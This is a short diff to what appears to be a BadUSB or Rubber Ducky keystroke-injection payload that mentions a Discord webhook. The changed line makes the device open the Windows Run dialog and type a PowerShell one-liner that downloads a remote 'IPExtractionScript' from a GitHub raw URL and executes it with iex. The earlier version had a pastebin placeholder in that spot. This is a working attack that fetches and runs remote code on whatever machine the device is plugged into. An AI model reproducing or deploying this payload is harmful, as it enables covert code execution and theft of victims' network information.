@@ -5,7 +5,7 @@ REM the discord webhook.
 DELAY 1000
 GUI r
 DELAY 1500
-STRING $e=(New-Object Net.WebClient).DownloadString('https://pastebin/raw/yourscript.ps1');iex $e
+STRING $e=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/IPExtractionScript.txt');iex $e
 DELAY 500
 ENTER
 REM DONE!
